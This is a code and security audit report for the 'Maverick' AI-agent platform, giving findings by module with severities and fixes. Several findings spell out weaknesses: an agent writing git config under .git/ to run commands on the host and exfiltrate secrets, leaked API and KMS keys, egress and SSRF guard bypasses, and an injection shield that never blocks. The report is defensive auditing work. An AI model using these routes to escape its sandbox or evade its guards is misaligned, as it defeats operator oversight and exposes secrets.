| W3-49 | medium | CODE_QUALITY_AUDIT.md — table row `packages/maverick-core/maverick/health.py:136-139,166-169` "doctor's live Anthropic/OpenAI key probe sets no client timeout" | `packages/maverick-core/maverick/health.py:166` | `doctor` provider probes still have no client timeout — unresolved prior finding |
| W3-73 | medium | QA_FINDINGS.md QA-061 — test_language_selector_discloses_partial_translation_scope (disclosure only; lang mismatch still present) | `packages/maverick-dashboard/maverick_dashboard/templates/base.html:2` | html lang is set to the selected UI language but the page content stays ~100% English (WCAG 3.1.1 mismatch); most catalog keys are never used |
| W4-66 | medium | CODE_QUALITY_AUDIT.md — findings table row `packages/maverick-core/maverick/compliance.py:142-145 Audit-logging control hardcoded to 'active' without probing that logging actually works` | `packages/maverick-core/maverick/compliance.py:145` | compliance_report() still hardcodes 'Audit logging (record-keeping)' as active without probing the writer (unresolved prior finding) |
| W5-3 | medium | PUNCHLIST_RESOLUTION.md line 144 ('zero release tags; publish.yml fires only on a v* tag') | `release-cohort.toml:2` | Current release pipeline has never run end-to-end: zero GitHub Releases exist, cohort 0.1.7 unreleased for 3 months, PyPI names empty, Homebrew sha256 is a placeholder |
| W5-75 | medium | CODE_QUALITY_AUDIT.md line 676 'SAML browser-SSO auth path ships disclosed as untested against any live IdP' | `packages/maverick-dashboard/tests/test_saml.py:3` | SAML ACS assertion handling is only tested against a fake `saml2` module; pysaml2 is never installed in any CI job |
| W5-100 | medium | FIXES.md — '[~] Sweep FEATURES.md / AGENTS.md for stale refs — the schema-version + pack-count refs are fixed' (regressed) | `docs/architecture.md:34` | Schema version stale in three architecture docs: 'v23' vs actual SQLite head v33 |
| W5-101 | medium | CODE_QUALITY_AUDIT.md:429 — 'Internal inconsistency on the headline number' (pack/suite counts) | `docs/index.md:6` | Suite count contradicts code and itself: '53 business suites' (README/index/press-kit/FEATURES) vs 54 in code and comparison.md |
| W5-102 | medium | CODE_QUALITY_AUDIT.md:429-430 headline-number inconsistency; FIXES.md:17 pack-count reconciliation (did not cover pitch/) | `pitch/ONE-PAGER.md:38` | Pack count '2,020' stale in all pitch collateral, FEATURES.md and the public enterprise architecture page (code: 2,031) |
| W5-103 | medium | CODE_QUALITY_AUDIT.md:127 — 'proof-pack — the literal command isn't registered' | `pitch/SECURITY-QUESTIONNAIRE.md:143` | `maverick proof-pack` does not exist as a CLI command but is the headline 'prove it' instruction in six pitch/security-questionnaire docs |
| W5-110 | medium | CODE_QUALITY_AUDIT.md:56/105 — firecracker.py empty-rootfs 'isolation' (module finding; the doc overclaim was not fixed) | `pitch/SECURITY-QUESTIONNAIRE.md:95` | Firecracker is counted as a shipped sandbox/deploy target in seven docs (incl. the security questionnaire) while README and the code call it a scaffold that raises NotImplementedError |
| W1-13 | low | CODE_QUALITY_AUDIT.md retry/__init__.py:3-6 (stale backoff docstring) — still unfixed at HEAD | `packages/maverick-core/maverick/retry/__init__.py:108` | Retry-After from the provider is clamped to MAX_DELAY (30s), guaranteeing a wasted re-429 when the server asks for longer; retry docstring still stale |
| W1-19 | low | CODE_QUALITY_AUDIT.md retry/classifier.py:61-110 (substring/regex classification) — unfixed, and a second copy exists in failover_policy.py | `packages/maverick-core/maverick/failover_policy.py:51` | Two divergent error classifiers (retry.classifier vs failover_policy.classify_error), both substring-matching English text |
| W1-20 | low | CODE_QUALITY_AUDIT.md cache/llm.py:13-15 (documents a cached_complete() that does not exist) — still unfixed | `packages/maverick-core/maverick/cache/llm.py:13` | Opt-in LLM response cache (cache/llm.py) is wired nowhere: zero callers of cache_key/lookup/store outside its own package |
| W1-42 | low | PUNCHLIST_RESOLUTION.md -- table row '`agent.py::_run_inner` \| 1,092 lines \| TurnLoop · PromptBuilder · CheckpointManager · ToolExecutionPipeline · SafetyGate · FinalAnswerExtractor' | `packages/maverick-core/maverick/agent.py:3374` | Agent._run_inner is still a 1,067-line single function (noqa C901) hosting six responsibilities; the PromptBuilder extraction did not reduce the loop itself |
| W1-63 | low | ADVERSARY_COUNCIL_REVIEW.md #13 — "Exactly-once" is at-least-once on the reclaim path; the CI soak gate never exercises it | `packages/maverick-core/maverick/job_queue.py:401` | JobQueue reclaim path is still at-least-once while docs and the soak gate say exactly-once (unresolved ADVERSARY_COUNCIL #13) |
| W1-64 | low | CODE_QUALITY_AUDIT.md — world_model.py:642-672 'At-rest decrypt passes unsealed values through by default instead of failing closed' | `packages/maverick-core/maverick/world_model.py:842` | At-rest read path passes unsealed values through by default (strict mode opt-in) — still present |
| W1-78 | low | ADVERSARY_COUNCIL_REVIEW.md, 'Refuted' table row: data-integrity — claim() reports a busy queue as empty (refuted as benign) | `packages/maverick-core/maverick/job_queue.py:241` | JobQueue.claim() returns None on a lost SELECT/UPDATE race, so a worker thread sleeps idle_sleep while ready jobs remain |
| W1-79 | low | ADVERSARY_COUNCIL_REVIEW.md #13 — "Exactly-once" is at-least-once on the reclaim path | `packages/maverick-dashboard/maverick_dashboard/app.py:437` | Code comments still advertise the automation queue as 'exactly-once' although both the reclaim path and the complete()-failure path are at-least-once |
| W1-80 | low | CODE_QUALITY_AUDIT.md — 'Daemon flusher thread leaks on reset_shared() and never stops' (notification_batcher.py:179-196) | `packages/maverick-core/maverick/notification_batcher.py:185` | Notification batcher flusher thread cannot be stopped and is orphaned on reset_shared() (unfixed prior finding) |
| W1-81 | low | CODE_QUALITY_AUDIT.md — 'OAuth token fetch/refresh runs the blocking HTTP call while holding the provider lock' (mcp_oauth.py:122-138) | `packages/maverick-core/maverick/mcp_oauth.py:122` | OAuth client-credentials token fetch performs the blocking HTTP call while holding the provider lock (unfixed prior finding) |
| W1-82 | low | CODE_QUALITY_AUDIT.md — "release() docstring claims 'Idempotent-safe' but a spurious extra call drops a live slot" (tenant/concurrency.py:58-67) | `packages/maverick-core/maverick/tenant/concurrency.py:58` | tenant.concurrency.release() is documented 'Idempotent-safe' but an unmatched release frees another caller's live slot (unfixed prior finding) |
| W1-97 | low | CODE_QUALITY_AUDIT.md rows 'firecracker.py:244-264 Docker-fallback ignores the configured image' and 'firecracker.py:22-26 SCAFFOLD markers' (root/memory/truncation gaps are new) | `packages/maverick-core/maverick/sandbox/firecracker.py:260` | Firecracker docker fallback runs as root with no memory cap and unbounded output while claiming to be 'at least as contained as the plain Docker backend' |
| W1-98 | low | ADVERSARY_COUNCIL_REVIEW.md #18; CODE_QUALITY_AUDIT.md 'firecracker.py:189-242 microVM isolation runs against an empty rootfs' | `packages/maverick-core/maverick/sandbox/firecracker.py:227` | Firecracker local path still runs commands with no workspace mount (unresolved prior finding) and passes a command form firectl does not accept |
| W1-103 | low | CODE_QUALITY_AUDIT.md rows 'pandas_query.py:31-45 Path confinement silently disabled when sandbox is None' and 'sql_query.py' (same pattern; wasm_run/notebook_exec instances and the host-absolute-path defect are new) | `packages/maverick-core/maverick/tools/wasm_run.py:69` | wasm_run passes host-absolute module/dir paths into the sandbox command — unusable under container backends, and unconfined when no sandbox is bound |
| W2-39 | low | CODE_QUALITY_AUDIT.md — 'Homoglyph-folding table maintained in two places with divergent coverage' (deobfuscate.py:60-73) | `packages/maverick-shield/maverick_shield/deobfuscate.py:59` | Divergent homoglyph fold tables between builtin_rules and deobfuscate leave inconsistent Unicode coverage |
| W2-40 | low | CODE_QUALITY_AUDIT.md — 'voice_safety.py:17-18 Docstring claims module-wide fail-open, but scan_transcript has no exception guard' | `packages/maverick-core/maverick/safety/voice_safety.py:494` | voice_safety.scan_transcript claims module-wide fail-open but has no exception guard |
| W2-41 | low | CODE_QUALITY_AUDIT.md — 'shield_ensemble.py Ensemble docstring claims an injection+jailbreak+exfil+policy lineup but ships injection/exfil/pii with no policy member' | `packages/maverick-core/maverick/shield_ensemble.py:174` | ShieldEnsemble advertises an injection+jailbreak+exfil+policy lineup but ships no policy/jailbreak member |
| W2-42 | low | CODE_QUALITY_AUDIT.md — 'cascade.py:1-18 Module docstring frames a regex/heuristic cheap-probe with Constitutional-Classifiers-v2 efficacy numbers it does not deliver' | `packages/maverick-shield/maverick_shield/cascade.py:5` | cascade.py docstring quotes Constitutional-Classifiers-v2 efficacy (86%->4.4%) the module does not deliver |
| W2-85 | low | CODE_QUALITY_AUDIT.md — table row `packages/maverick-core/maverick/tenant/registry.py:299-323 tenant_spend_today reaches into UsageLedger._load() private API` | `packages/maverick-core/maverick/tenant/registry.py:692` | tenant_spend_today still reaches into UsageLedger._load() private API (unresolved prior finding) |
| W3-64 | low | CODE_QUALITY_AUDIT.md — row `packages/maverick-core/maverick/cli/__init__.py:5904-5906` "cost --model filter is non-functional"; PUNCHLIST_RESOLUTION.md line 46 "cli `cost --model` honest error" | `packages/maverick-core/maverick/cli/__init__.py:7000` | `cost --model` help still advertises 'Filter to one model id.' although the option now unconditionally errors |
| W4-39 | low | CODE_QUALITY_AUDIT.md — Appendix B — Swallowed error / silent failure (41), row `packages/maverick-core/maverick/ai_act_package.py`:32-41 | `packages/maverick-core/maverick/ai_act_package.py:32` | ai_act_package._safe still swallows every exception silently (unresolved prior finding) |
| W5-46 | low | CODE_QUALITY_AUDIT.md — table row `deploy/relay/relay.py`:89-91 'Malformed Content-Length header raises an uncaught ValueError' | `deploy/relay/relay.py:89` | Relay: malformed Content-Length still raises an uncaught ValueError (500) instead of a clean 4xx — prior finding unresolved |
| W5-47 | low | CODE_QUALITY_AUDIT.md — table row `deploy/relay/relay.py`:102-103 'Caller-supplied budget is forwarded to the dashboard with no type or range validation' | `deploy/relay/relay.py:107` | Relay forwards caller-supplied 'budget' unvalidated — prior finding unresolved |
| W5-68 | low | STRESS_TEST.md 'One residual flake, characterized' (test_llm_hedge wall-budget timing) | `packages/maverick-core/tests/test_q2_2026_batch1.py:141` | Timing-window assertions and 95 sleep() calls make several tests contention-sensitive on 2-core CI runners |
| W5-95 | low | CODE_QUALITY_AUDIT.md §'Pitch deck contradicts the product' (line 101) — content drift only; the repo-hygiene aspect is new | `pitch/README.md:1` | Investor decks and other binary pitch assets (~4.2 MB, 16% of the pack) are versioned in the code repository |
| W5-119 | low | FIXES.md:20 — '[~] Sweep FEATURES.md / AGENTS.md for stale refs' (open-ended sweep never covered ARCHITECTURE.md) | `ARCHITECTURE.md:54` | ARCHITECTURE.md module inventory is years out of date (cli.py/skill_embeddings.py missing, 7 of 293 tools, 10 of 17 channels, wrong installer path) |
| W1-10 | improvement | CODE_QUALITY_AUDIT.md bedrock_provider.py:31 (fake 'bedrock-no-auth' bearer) — that part is fixed; the auth-model and feature-loss gap remains | `packages/maverick-core/maverick/providers/bedrock_provider.py:31` | Bedrock adapter is bearer-key-only, routes Claude through the OpenAI translator (no caching/thinking/signatures) and ships a dated default model id |
| W5-89 | improvement | PUNCHLIST_RESOLUTION.md:132 — 'pyright/mypy incrementally on leaf modules' | `packages/maverick-knowledge/maverick_knowledge/store.py:83` | Type-checking baseline measured: pyright on the three leaf packages yields 158 errors, ~half optional-import noise and zero confirmed bugs in the sample — adopt as advisory only |
| W5-128 | improvement | FIXES.md:17-20 — manual pack-count reconciliation across README/FEATURES/press-kit/comparison/index | `docs/press-kit.md:3` | Generate the headline counts in docs from code instead of hand-editing eleven files |

## Appendix A — every retained finding, by area

### core/coding (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-1 | critical | Confirmed (hand spot-check at close-out) | security | `packages/maverick-core/maverick/edit_format.py:670` | Repo-local git config (core.fsmonitor / filter smudge) executes arbitrary commands during host-side git diff — agent- or repo-controlled RCE + secret exfiltration | Route every host-side git invocation in edit_format.py, reviewer.py and coding_mode.py through the same hardening orchestrator.py already uses: (1) run under `_git_env_without_user_config()` (GIT_CONFIG_GLOBAL/SYSTEM=devnull, GIT_CONFIG_COUNT overrides for core.fsmonitor=false) AND scrub_env() so no provider secret is in the child env; (2) call `_git_metadata_may_execute_filters(wd)` and refuse when true; (3) unconditionally block writes under `.git/` in tools/fs.py (not only in opaque benchmark mode). Add `-c core.fsmonitor=false -c core.hooksPath=/dev/null` to the argv as belt-and-suspenders. | M |
| W2-4 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/coding_mode.py:2040` | coding_mode candidate evaluation runs `git worktree add` / `reset --hard` on the host with no filter guard or env scrub | Apply the orchestrator hardening (filter-metadata guard + scrubbed, config-neutralised env) to every git call in _evaluate_candidate, or perform candidate application through sandbox.exec on a non-host backend. At minimum add `-c core.fsmonitor=false` and refuse when _git_metadata_may_execute_filters(workdir) is true. | M |
| W2-2 | high | Confirmed (hand spot-check at close-out) | security | `packages/maverick-core/maverick/reviewer.py:159` | render_diff / get_diff leak the full host environment (provider API keys) into git subprocesses | Pass `env=scrub_env()` (or scrub_child_env()) to every host git subprocess in reviewer.py and edit_format.py, matching tools/git_advanced.py and tools/preview_diff.py which already scrub. Set GIT_PAGER="" and GIT_CONFIG_GLOBAL/SYSTEM=os.devnull as those helpers do. | S |

### core/ai_evidence_gateway (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-29 | high | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/ai_evidence_gateway.py:1365` | A delivery that fails after the conversation reservation permanently blocks every later turn of that conversation (no abandon/expiry path) | Either (a) wrap render+sign in try/except and clear the reservation (compare-and-swap on the same receipt_id) on failure, or (b) add a bounded reservation TTL: when `pending.issued_at` is older than N seconds and no signed row exists for pending.receipt_id in the ledger, allow a new reservation to supersede it (recording the abandoned receipt_id in the audit trail). Add an operator API to abandon a pending reservation, and a test for the failure-then-new-key sequence. | M |
| W4-30 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/ai_evidence_gateway.py:4123` | Cockpit /gateway/summary re-verifies every signature in the whole receipt ledger and loads every governed receipt record on each request | Cache the assurance snapshot keyed by the signed LedgerState.state_hash (it already brackets the view with start/end state), and/or maintain verified-through counters in the index so summary() does incremental verification from the last verified ordinal. Expose the full re-verification as an explicit operator action (verify_integrity endpoint) rather than on every summary read. | M |

### core/ai_evidence_ledger (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-28 | high | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/ai_evidence_ledger.py:1780` | Segmented receipt ledger re-verifies the whole active segment on every append (O(n) per delivery, measured 64 ms -> 237 ms and climbing) | After AuditSigner.write, verify only the newly appended tail: read the last line, check prev_hash == state.active_segment_tip, hash/signature of that one row, and use the known row count from the authenticated state (+1) instead of _verify_file(segment_path). Keep full-segment verification for rebuild/verify_integrity paths. Add a regression test asserting append cost is independent of segment size (e.g. time 50 appends at row 10 vs row 3,000). | M |

### core/air_gap (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-90 | high | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-core/maverick/air_gap.py:88` | `maverick airgap check` can report 'clean' while the process-wide egress guard is off: it checks [egress] deny=['*'] (enforced by ~15 modules) but never [enterprise] mode, which is what egress_guard actually enforces | Add a violation when enterprise mode is not on for the audited config (config['enterprise']['mode'] is not True and MAVERICK_ENTERPRISE not truthy and no compliance floor requiring FLOOR_EGRESS_LOCK), and when [enterprise] allowed_hosts is non-empty; alternatively make egress_guard._denied also apply tenant.egress.host_allowed so [egress] deny=['*'] is enforced at the seam. Update test_air_gap.py fixtures accordingly. | S |

### core/assessment (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-59 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/assessment.py:4996` | assessment.list_saved() crashes once the sibling assessments.py register exists in the same data directory | Give assessments.py its own subdirectory (e.g. data_dir("assessment_register")) or reserve the stems 'register' and 'templates' in assessment.py's glob (skip them explicitly). Additionally make list_saved() skip-and-log a record whose id does not match its filename instead of raising, so one foreign/corrupt file cannot take down every listing endpoint. Add a regression test that writes register.json and templates.json into the shared dir and asserts list_saved() still works. | S |
| W4-71 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/assessment.py:4996` | assessment.list_saved() reads, locks and may rewrite every assessment file on each call and is invoked per request from several dashboard endpoints | Maintain a lightweight index (one JSON/SQLite row per assessment with the summary fields list_saved already computes) updated inside the same locked write that mutates a record, and make list_saved read the index; move the audit-outbox retry to the scheduler (list_saved_heads already documents that reads must not mutate). Cache custom_template_records similarly. | M |

### core/audit signing (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-46 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/audit/signing.py:345` | Audit signing key is a general-purpose signing oracle: detached-digest and federation-envelope signatures are byte-compatible with audit rows, so forged rows verify clean | Domain-separate every non-row use of the audit key: sign_detached_digest should sign b'maverick-detached-digest/v1\x00'+digest (and verifiers must expect it); sign_envelope should sign a 'maverick-federation-envelope/v1' prefixed message; ideally AuditSigner rows should also sign a versioned prefix + hash (new key_id/format version so old rows keep verifying). Add a regression test that a detached signature never verifies as an audit row. | M |

### core/backup (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-45 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/backup.py:664` | DR backup archive bundles the at-rest encryption key next to the sealed world.db | Exclude `keys/` (at_rest.key, at_rest.d/, audit signing keys) from _excluded_from_snapshot() by default and add an explicit `--include-keys` flag that prints a loud warning; better, seal the whole payload (or the manifest-listed sensitive files) under a backup-specific key derived from MAVERICK_BACKUP_SIGNING_KEY so the archive is confidential as well as authenticated. Document that key escrow is a separate step and add a test asserting no *.key member appears in a default archive. | S |
| W1-51 | high | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/backup.py:1161` | restore_backup has no live-process guard: restoring while the dashboard/agent holds world.db open silently loses every subsequent write | Before applying, take the world's own cross_process_lock(world.db) and refuse when it is held / when a WAL or SHM sidecar exists with recent mtime, or add an explicit `--i-stopped-the-service` acknowledgement; at minimum document 'stop maverick serve / dashboard before restore' in the CLI help and operations.md, and have WorldModel detect inode change on its connection (fstat vs stat) and reopen. | M |
| W1-66 | low | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/cli/_trust_groups.py:322` | maverick backup create on a Postgres deployment silently produces an archive with no world data | In backup_create_cmd/create_backup, detect is_postgres_configured() and either refuse without `--data-root-only`, or emit a red warning and record `world_backend: postgres` in the manifest so restore can warn too. | S |

### core/consent_preferences (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-1 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/consent_preferences.py:3721` | unified_audit_records raises permanently for any tenant that has unlinked a profile (Operating Record capture breaks) | Add "profile.unlinked": "relationship_changed" (or a dedicated action) to the actions map in unified_audit_records; add a regression test that links, unlinks, then calls unified_audit_records. Consider making the map a module constant shared with _outbox event_type validation so new outbox event types cannot be added without an audit mapping. | S |
| W4-2 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/consent_preferences.py:416` | Expired newer receipt falls through to an older permanent grant in enforcement decisions | In _decision_from_receipts, when the newest receipt contains a matching scope whose expiry has lapsed, return a terminal EnforcementDecision(False, "expired_grant") (or treat expiry as supersession) instead of continuing to older receipts; document the intended semantics and add tests for expired-newer-grant and expired-newer-deny cases. | S |
| W4-12 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/consent_preferences.py:3015` | decide() re-verifies entire link-event hash chains (up to 10k events per linked profile) on every enforcement call | Verify chains on write and in verify_profile_link_integrity, not on every read; in _profile_group trust consent_profile_link_current.record_sha256 (already integrity-checked) and drop the per-decision history replay, or cache verified head digests per (tenant, profile, revision). | M |

### core/external_agents (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-32 | high | Confirmed (hand spot-check at close-out) | security | `packages/maverick-core/maverick/external_agents.py:1053` | External-agent/federation shield screen never blocks: verdict.blocked read on a ShieldVerdict that has no such attribute | Replace `getattr(verdict, "blocked", False)` with `not getattr(verdict, "allowed", True)` at external_agents.py:291, 1053, 1421 (and audit any other `.blocked` reads). Add a unit test that feeds a known-blocking payload through _sanitize/the action gate and asserts denial. Consider giving ShieldVerdict a `blocked` property alias to make the two spellings equivalent and prevent recurrence. | S |

### core/llm circuit breaker (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-2 | high | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/llm.py:1450` | Budget exhaustion and client-side 400s trip the provider circuit breaker, fast-failing every other goal/tenant in the process for 30s | Feed the breaker only with provider-transport outcomes: classify the exception before _feed_circuit and record a failure only for 429/5xx/timeout/connection classes (reuse retry._is_retryable_status_error / failover_policy.classify_error), never for BudgetExceeded, ModelNotAllowedError, PreflightFailed, EgressBlocked or 4xx. Consider keying the breaker by (provider, base_url/tenant) so one tenant's quota problem cannot open another's circuit. | S |

### core/llm model catalog (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-3 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/llm.py:47` | Catalogued model 'claude-opus-4-8-fast' is a phantom id sent verbatim to the API; fast mode needs speed='fast' + beta header and cannot work | In AnthropicClient._build_request, map MODEL_OPUS_FAST to model='claude-opus-4-8' + speed='fast' + the fast-mode beta (routing through client.beta.messages), or remove the SKU from MODEL_CATALOG/wizard until implemented. Add a request-shape test that asserts the outbound `model` never contains '-fast'. Note fast mode is unavailable on Bedrock/Vertex/Foundry and has its own rate limit; fall back to standard Opus on 429. | S |

### core/llm pricing gate (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-1 | high | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/llm.py:1437` | Default strict pricing refuses every Azure/Bedrock/openai_compatible/Moonshot/OpenRouter call BEFORE dispatch, even with no budget | Separate the pre-dispatch *estimate* from the post-response *bill*: call _estimate_call_cost with estimate_only=True (it is a hold/projection, not an invoice) and only require a verified rate in Budget.record_tokens. For providers whose ids are structurally unpriceable (azure deployment names, bedrock, openai_compatible) add a per-provider `[providers.<name>] price_in/price_out` knob that produces a verified-by-operator ModelPrice, and surface the strict-pricing refusal in `maverick doctor` / the model picker instead of at call time. Remove unverified models from MODEL_CATALOG or badge them 'estimate-only'. | M |

### core/sandbox + tenant/kms (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-45 | high | Confirmed (hand spot-check at close-out) | security | `packages/maverick-core/maverick/sandbox/local.py:22` | MAVERICK_KMS_KEK (tenant DEK wrapping key) is not scrubbed from the sandbox shell environment | Add `KEK` (and `SALT`, `SEED`, `SIGNING`) to _SECRET_ENV_RE, and add MAVERICK_KMS_KEK / MAVERICK_ENCRYPTION_KEY / MAVERICK_AUDIT_SIGNING_KEY_WRAPPED to _ALWAYS_STRIP_ENV as explicit records; add a test that every secret-bearing env name in docs/env-vars.md is stripped by scrub_env. | S |

### core/tenant/egress (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-69 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tenant/egress.py:4` | Per-tenant egress plane is consulted by exactly one of 73 network tools; docstring claims it applies to every tool | Hook the tenant plane into egress_guard's one-request seam (call tenant.egress.host_allowed(host) alongside egress_permitted for the active tenant via current_tenant_id()), or delete the 'every tool' claim and document it as http_fetch-only. Add an egress_contract-style CI assertion that the wrapped seam consults tenant.egress. Until then, remove the claim from the docstring and docs/multi-tenancy.md. | M |
| W2-70 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tenant/egress.py:38` | Tenant egress policy fails OPEN when config.toml is unreadable (quotas/tenancy policies fail closed on the same condition) | Mirror quotas._quota_config: call config_source_errors() and raise (or return a deny-all policy) when an active config source is invalid; keep the fail-open only for 'no [egress] table at all'. | S |

### core/tools (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-3 | high | Confirmed (hand spot-check at close-out) | security | `packages/maverick-core/maverick/tools/fs.py:199` | write_file allows writing under .git/ outside benchmark opaque mode (enables git-config hook injection) | In _safe_resolve / write_text_contained, unconditionally refuse any resolved path containing a `.git` segment for WRITES (keep the opaque-mode read block as-is). This closes the config-injection path even if a host git call is missed. | S |
| W2-5 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/shell.py:34` | shell.py opaque-mode git-diff gold-leak regex is superlinear (ReDoS) on model-supplied command | Anchor/bound the prefix: replace `[^\n;&\|]*?` with a bounded `[^\n;&\|]{0,200}?` or restructure to match `git` then tokenise the argument list in Python instead of one megaregex. Cap the command length before running the gold-leak patterns. | S |
| W5-66 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/maverick/tools/knowledge.py:14` | Shipped tool wrappers with no dedicated tests: knowledge_search (0%), maverick analytics CLI (0%), breach_notification tool (18%), pandas_query (22%) | Add packages/maverick-core/tests/test_tools_knowledge.py (compartment: search limited to `collections`, empty query handling), test_breach_notification_tool.py for the status/deadline math, and a CliRunner test for `maverick analytics` with duckdb absent and present. | S |

### core/tools/browser (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-88 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/browser.py:342` | browser tool (Playwright) is outside both the process-wide egress guard and the enterprise/tenant egress checks | Gate _browser_navigate/_browser_go_back/_browser_go_forward/click on enterprise.enterprise_egress_denial(url, tool='browser') and tenant.egress.egress_allowed('browser', host); additionally register a Playwright page.route('**/*') handler that aborts any request whose host fails egress_permitted/is_blocked_host (this also fixes the post-hoc redirect problem in the next finding). Document the browser as outside the HTTP seam in egress_guard's module docstring and enterprise.py's 'what it still does not cover' list. | M |
| W2-89 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/browser.py:299` | browser SSRF guard is post-hoc: a redirect to an internal host is fetched (side effects fire) before the session is closed, and subresource/XHR loads are never checked | Install a page.route('**/*') (or browser_context.route) handler at session creation that resolves each request's host through http_fetch.is_blocked_host / enterprise.egress_permitted and route.abort()s failures, so redirects and subresources are blocked before the socket opens; keep the post-navigation check as defense in depth. | M |

### core/tools/http_fetch (urllib path) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-94 | high | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/http_fetch.py:321` | guarded_urlopen breaks behind any HTTP(S) proxy on a private/loopback address: the pinned connection refuses the proxy host (reproduced on this box) | In _make_pinned_connect, detect proxied requests (self._tunnel_host is set, or req.host != urlparse(req.full_url).hostname) and skip pinning of the proxy hop (the target was already validated by _check_url_allowed; the proxy is operator-trusted), or explicitly pass ProxyHandler({}) to disable proxies for this opener and document that guarded fetches ignore proxies (matching safe_client). Add a regression test that sets HTTPS_PROXY to a 127.0.0.1 address and asserts guarded_urlopen does not raise BlockedHost-style errors. | S |

### core/tools/websocket (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-87 | high | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/websocket_tool.py:85` | websocket tool bypasses the enterprise tool-egress lock entirely (websockets library is not wrapped, no enterprise_egress_denial call) | In _run(), before resolve_pinned_ip, call enterprise.enterprise_egress_denial(url.replace('ws','http',1), tool='websocket') and tenant.egress.egress_allowed('websocket', host) and return the ERROR string on denial; add 'websockets.connect' to egress_contract._HTTP_CALLS mapped to a library that is NOT in COVERED_LIBRARIES so the module is recorded in KNOWN_UNCOVERED; add a test in test_enterprise_tool_egress.py that enables enterprise mode and asserts the websocket tool refuses a public host. | S |

### core/world_model (9)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-52 | high | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/world_model.py:1213` | Per-thread SQLite reader connections are retained for the life of the WorldModel: short-lived threads leak a connection and two FDs each | Track reader connections with weakref/finalizers keyed on thread liveness: store them in a dict keyed by thread ident and prune entries whose thread is no longer alive on each _reader() call (or use a small bounded pool of reader connections handed out under a lock instead of thread-locals). Add a regression test that spawns N short-lived threads and asserts len(_reader_conns) stays bounded. | S |
| W1-53 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/world_model.py:359` | messages_fts indexes ciphertext under the default at-rest encryption: doubles message storage while search_messages returns nothing and has no callers | Either skip FTS maintenance when at-rest is on (make the trigger conditional on the row not starting with 'MVKAR1:' / drop the triggers and the GIN index under encryption) and give SQLite the same bounded scan-then-decrypt fallback PG has, or remove search_messages and the FTS objects entirely (a new migration) since nothing calls it. Document the storage impact either way. | M |
